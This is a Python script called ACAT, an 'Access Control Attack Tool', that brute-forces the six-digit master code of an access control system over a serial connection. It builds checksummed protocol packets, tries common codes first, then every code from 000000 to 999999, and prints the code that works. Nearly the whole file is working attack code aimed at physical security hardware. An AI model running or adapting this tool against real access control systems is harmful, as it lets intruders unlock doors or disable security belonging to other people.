#!/usr/bin/python
#################################################################
# ACAT - Access Control Attack Tool - Brute Forcer V2
# By: Dennis Linuz <dennismald@gmail.com>
#
# Tools for controlling Access Control Systems
#
# Todo:
#	- FIX: Make this PEP 0008 compliant
#	- ADD: Confirmation checks for found passwords
#	- ADD: Arguments for starting password
#	- ADD: KeyboardInterrupt exception handling for brute-force
#	- ADD: More Comments
#################################################################

# First party libraries
import binascii
import sys

# Third party
import serial

baudrate = 38400
bruteforce_timeout = 0.1
serial_interface = "COM1"

# Start serial connection on specified interface
ser = serial.Serial(serial_interface, baudrate=baudrate, timeout=bruteforce_timeout)

def generateChecksum(input):
	packet = binascii.a2b_hex(input)
	num = 0
	num2 = 4
	while (num2 < len(packet)-2):
		num3 = int(binascii.b2a_hex(packet[num2]), 16) ^ (255 & num)
		num3 = num3 ^ (255 & num3 << 4)
		num = (num >> 8 ^ num3 << 8 ^ num3 << 3 ^ num3 >> 4)
		num2 = num2 + 1
	return packet[:-2]+binascii.a2b_hex(hex(num)[2:].zfill(4))

def SendCommand(command, len):
	ser.flushInput()
	#ser.write(binascii.a2b_hex("fffa2c6908fff0fffa2c7001fff0"))
	ser.write(generateChecksum(command))
	return ser.read(len)

def BruteForceAttack(codeInput):
	global found_password
	actualCode = str(codeInput).zfill(6)
	print "Guess: " + actualCode
	code = binascii.b2a_hex(actualCode[::-1])
	fullPacket = "5AA5000A1101" + code + "0000"
	ser.write(generateChecksum(fullPacket))
	response = binascii.b2a_hex(ser.readline())
	if response == "5aa50004110c4625":
		print ""
		print "[!] Success!"
		print "[*] Master Code: " + actualCode
		print ""		
		found_password = str(actualCode)
		return 1
	elif not(len(response) == 18):
		return BruteForceAttack(codeInput)

def BruteforcePassword():
	found = 0
	ser.timeout = bruteforce_timeout
	commonCodes = ["123456",
	"654321","000000",
	"111111","222222",
	"444444","555555",
	"666666","777777",
	"888888","999999"]
	for i in commonCodes:
		if BruteForceAttack(i):
			found = 1
			break
	if found == 1:
		return
	print "[!] Not a common code. Brute forcing now..."
	print ""
	for i in range(000000, 999999):
		if BruteForceAttack(i):
			found = 1
			break
	if found == 1:
		return
	print "[!] Code not found. Something must have gone wrong. :("
	print ""


BruteforcePassword()